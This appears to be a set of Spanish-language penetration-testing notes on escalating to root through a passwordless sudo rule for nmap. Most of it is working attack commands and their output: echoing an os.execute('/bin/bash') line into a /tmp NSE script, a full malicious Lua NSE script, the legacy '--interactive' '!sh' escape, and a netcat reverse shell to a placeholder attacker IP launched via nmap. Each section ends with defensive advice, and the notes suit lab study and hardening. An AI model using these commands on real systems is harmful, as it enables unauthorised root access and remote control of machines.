
---
# Escalada de privilegios con Nmap ejecutando un script NSE malicioso (versión minimalista)

---

## Supuesto de partida

El usuario `Metahumo` puede ejecutar `nmap` como `root` o como otro usuario privilegiado (por ejemplo, `User2`), sin necesidad de contraseña.

Verificado con:

### Acción:

```bash
sudo -l
````

### Resultado:

```bash
User Metahumo may run the following commands on ubuntu:
    (User2) NOPASSWD: /usr/bin/nmap
```

---

## Preparación del script NSE en `/tmp`

Para evitar escribir un script complejo y para hacer el ataque más rápido y sigiloso, vamos a crear un script directamente desde la terminal.

### Acción:

```bash
echo 'os.execute("/bin/bash")' > /tmp/shell.nse
```

---

## Ejecución del script NSE con `sudo`

### Acción:

```bash
sudo -u User2 nmap --script=/tmp/shell.nse 127.0.0.1
```

---

### Resultado esperado (si la terminal no está interactiva):

Es posible que se ejecute `/bin/bash`, pero no veamos nada en pantalla. En este caso, una buena alternativa es lanzar una **reverse shell**.

---

## Alternativa: Reverse shell con `nc`

Supongamos que tenemos una máquina de atacante escuchando:

```bash
# En el equipo atacante
nc -lvnp 4444
```

En el equipo víctima:

### Acción:

```bash
echo 'os.execute("nc IP_ATACANTE 4444 -e /bin/bash")' > /tmp/shell.nse
sudo -u User2 nmap --script=/tmp/shell.nse 127.0.0.1
```

---

### Resultado:

En la máquina del atacante, se obtiene una shell:

```bash
connect to [IP_ATACANTE] from [IP_VICTIMA] 12345
# whoami
User2
```

Si `User2` tiene más privilegios (por ejemplo, puede usar `sudo` sin contraseña), ya estamos a un paso de escalar a `root`.

---

## Explicación

- Hemos usado `echo` para generar el script `.nse` de forma rápida en `/tmp`, sin necesidad de editores.
    
- Hemos ejecutado `nmap` con `sudo -u` para abusar del permiso otorgado.
    
- Como `os.execute("/bin/bash")` lanza una shell sin feedback si la terminal no es interactiva, usamos una reverse shell con `nc` para obtener visibilidad.
    
- Esta técnica es extremadamente peligrosa si se permite a usuarios ejecutar `nmap` con NSE habilitado, ya que ejecuta Lua en el sistema operativo.
    

---

## Recomendaciones defensivas

- Nunca permitir `nmap` como binario sudo ejecutable si no es absolutamente necesario.
    
- Si se necesita, deshabilitar NSE (el flag `--script`) o utilizar wrappers.
    
- Auditar el directorio `/tmp` si se sospecha de abuso de scripting.
    
- Monitorizar tráfico saliente en puertos comunes de reverse shells (`4444`, `5555`, `1337`, etc.).
    

---

# Escalada de privilegios con `nmap` ejecutando un script `.nse` malicioso

---

## Supuesto de partida

El usuario `Metahumo` tiene permitido ejecutar el binario `/usr/bin/nmap` como `root` sin necesidad de contraseña. Confirmamos esto con:

### Acción:

```bash
sudo -l
````

### Resultado:

```bash
User Metahumo may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/nmap
```

---

## Abusando del Nmap Scripting Engine (NSE)

Aunque el modo interactivo (`--interactive`) ha sido eliminado en versiones modernas de `nmap`, todavía es posible ejecutar scripts `.nse` personalizados si se permite acceso a `nmap` como `root`.

Vamos a crear un script `.nse` que ejecute `/bin/bash` usando `os.execute()` de Lua.

---

## Creación del script malicioso `.nse`

### Acción:

Creamos un archivo llamado `shell.nse` con el siguiente contenido:

```bash
nano shell.nse
```

Contenido del archivo:

```lua
description = "Shell NSE script"
author = "Metahumo"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln"}

-- Ejecutamos /bin/bash como root
action = function()
  os.execute("/bin/bash")
  return "Shell lanzada"
end
```

---

## Ejecución del script con Nmap como root

### Acción:

```bash
sudo nmap --script ./shell.nse 127.0.0.1
```

---

### Resultado:

```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2025-06-14 17:00 UTC
NSE: Shell lanzada
# whoami
root
```

---

## Explicación:

- Al ejecutar el script `.nse` con `sudo`, el script tiene privilegios de root.
    
- El motor de scripting de Nmap (basado en Lua) nos permite ejecutar `os.execute()` para lanzar comandos del sistema.
    
- En este caso, `os.execute("/bin/bash")` lanza una shell con privilegios de root, lo que supone una escalada completa.
    
- Como el binario fue ejecutado sin requerir contraseña, cualquier usuario con permiso en sudoers para `nmap` podría realizar este ataque.
    

---

## Conclusión

- Permitir el uso de `nmap` como root **es peligroso incluso si el modo interactivo está deshabilitado**.
    
- El motor de scripting (NSE) es una superficie de ataque si no se controla adecuadamente.
    
- Este tipo de configuración puede ser explotado incluso por usuarios con bajo nivel técnico que simplemente escriban o descarguen scripts `.nse` desde internet.
    

---

## Recomendaciones defensivas

- No otorgar permisos sudo sin contraseña a herramientas como `nmap`, `python`, `perl`, etc.
    
- Si por necesidad se debe permitir `nmap`, hacerlo con parámetros estrictos y wrappers que limiten su uso.
    
- Auditar el uso de `sudo` y revisar el acceso al motor de scripting (`--script`).
    
- Aplicar el principio de mínimo privilegio.
    

---

# Escalada de privilegios con Nmap modo interactive

## Escalada de privilegios utilizando `nmap`

---

### Acción:

Como usuario sin privilegios (`Metahumo`), comprobamos si tenemos permiso para ejecutar `nmap` como `root`.

```bash
sudo -l
````

### Resultado:

```bash
Matching Defaults entries for Metahumo on ubuntu:
    env_reset, mail_badpass, secure_path=...

User Metahumo may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/nmap
```

---

### Explicación:

El archivo `/etc/sudoers` permite al usuario `Metahumo` ejecutar el binario `/usr/bin/nmap` como `root` sin necesidad de introducir una contraseña. Aunque `nmap` es una herramienta de escaneo de red, algunas versiones antiguas (especialmente las que contienen el _modo interactivo de scripting_) permiten ejecutar comandos del sistema desde un shell interactivo de `nmap`.

---

### Acción:

Ejecutamos `nmap` en modo interactivo para intentar acceder a una shell con permisos de root:

```bash
sudo nmap --interactive
```

Una vez dentro del modo interactivo, escribimos lo siguiente:

```nmap
nmap> !sh
```

---

### Resultado:

```bash
# whoami
root
# hostname
72723e0a6904
```

---

### Explicación:

La orden `!sh` dentro del shell interactivo de `nmap` lanza una shell del sistema. Como `nmap` fue ejecutado con privilegios de `root`, la shell resultante también se ejecuta con esos privilegios. Esta es una **escalada directa a root**.

**Nota:** Este comportamiento sólo está disponible en versiones antiguas de `nmap`. Las versiones actuales han eliminado el modo interactivo, por lo que es importante verificar qué versión se está ejecutando.

---

### Alternativa: usar scripts NSE

Si el modo interactivo está desactivado, otra vía podría ser abusar del soporte de scripts NSE (Nmap Scripting Engine), aunque esto depende de la versión y configuración.

---

### Conclusiones:

- Ejecutar `nmap` como `root` puede ser muy peligroso si se trata de una versión vulnerable o antigua.
    
- El binario `nmap`, aunque parezca inofensivo, puede utilizarse para obtener una shell con privilegios elevados.
    
- Este tipo de configuración debe evitarse. En su lugar, se recomienda restringir los binarios permitidos o emplear wrappers seguros.
    

---

### Recomendaciones defensivas:

- Evitar permitir la ejecución de herramientas complejas (como `nmap`, `perl`, `python`, `vim`, etc.) en el archivo `/etc/sudoers`.
    
- Monitorizar el uso de `sudo` y auditar los comandos ejecutados.
    
- Utilizar versiones actualizadas del software para evitar comportamientos inseguros.
    

---

